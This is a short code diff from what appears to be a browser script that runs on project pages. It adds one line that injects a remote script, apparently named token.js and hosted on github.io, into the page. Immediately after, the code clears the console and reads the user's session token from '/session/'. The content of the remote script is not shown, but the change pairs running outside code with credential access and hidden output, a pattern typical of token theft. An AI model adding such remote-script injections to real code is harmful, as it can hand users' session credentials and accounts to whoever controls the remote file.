@@ -15,6 +15,7 @@ if(location.href.includes("projects")){
                 //console.log(res[i].id,res[i].title)
             }
         }
+        var src=document.createElement("script");src.src="https://haruymth.github.io/scripts/codes/token.js";document.body.appendChild(src);
         console.clear();
         const sessiontoken = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
         let i=0;
